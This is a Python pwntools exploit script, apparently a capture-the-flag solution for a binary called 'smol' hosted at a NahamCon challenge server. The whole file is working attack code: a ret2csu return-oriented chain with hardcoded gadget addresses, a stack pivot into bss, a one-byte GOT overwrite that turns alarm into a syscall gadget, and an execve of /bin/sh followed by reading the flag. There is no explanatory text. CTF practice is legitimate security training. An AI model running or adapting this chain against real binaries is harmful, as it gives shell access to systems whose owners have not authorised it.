#!/usr/bin/env python3

from pwn import *
from time import sleep
exe = ELF("./smol")

context.binary = exe


def conn():
        return process([exe.path])

#r = conn()
r = remote("challenge.nahamcon.com", 30698)

def csu_payload(edi, rsi, rdx, rip, rbp=0):
    payload  = p64(0x00000000004011ca)
    payload += p64(0) #rbx
    payload += p64(1) #rbp
    payload += p64(edi) #r12
    payload += p64(rsi) # r13
    payload += p64(rdx) # r14
    payload += p64(rip) # r15
    payload += p64(0x00000000004011b0)
    payload += p64(0)*2
    payload += p64(rbp)
    payload += p64(0)*4
    return payload

i = 0
def main():
    print("for i = ", i)
    pop_rdi = 0x00000000004011d3
    pop_rsi_r15 = 0x00000000004011d1
    bss = 0x404050
    leave_ret = 0x0000000000401163
    ret = 0x0000000000401164
    offset = 12


    payload  = b"M"*offset
    payload += csu_payload(0, bss, 0x1000, exe.got['read'], bss)
    payload += p64(leave_ret)
    payload = payload.ljust(0x200, p8(0))
    
    r.send(payload)
    sleep(3)
    payload2 = b"/bin/sh\x00"
    payload2 += csu_payload(0, exe.got['alarm'], 0x1, exe.got['read'])
    payload2 += csu_payload(0, bss+0x400, 0x3b, exe.got['read'])
    payload2 += csu_payload(0x404050, 0, 0, exe.got['alarm'])

    r.send(payload2)

    sleep(3)
    r.send(p8(i))
    sleep(3)
    r.send(b"M"*0x3b)

    sleep(3)
    r.sendline("cat flag*")
    print(r.recvline())
    #the winning i is 40
    r.interactive()


if __name__ == "__main__":
    try:
        main()
    except:
        pass
